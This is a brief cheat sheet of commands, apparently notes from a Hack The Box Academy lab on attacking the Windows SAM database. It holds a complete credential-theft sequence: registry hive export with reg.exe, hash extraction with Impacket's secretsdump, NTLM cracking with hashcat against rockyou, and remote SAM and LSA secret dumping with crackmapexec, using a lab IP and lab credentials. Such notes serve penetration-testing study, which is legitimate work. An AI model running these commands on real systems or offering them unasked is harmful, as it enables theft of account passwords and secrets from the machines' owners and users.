# Attacking SAM
## Using reg.exe save to Copy Registry Hives
```
> reg.exe save hklm\sam C:\sam.save
> reg.exe save hklm\system C:\system.save
> reg.exe save hklm\security C:\security.save
```

## Dumping Hashes with Impacket's secretsdump.py
```
$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

$ impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

## Cracking Hashes with Hashcat
```
$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
## Remote Dumping & LSA Secrets Considerations
### Dumping LSA Secrets Remotely
```
$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

### Dumping SAM Remotely
```
$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```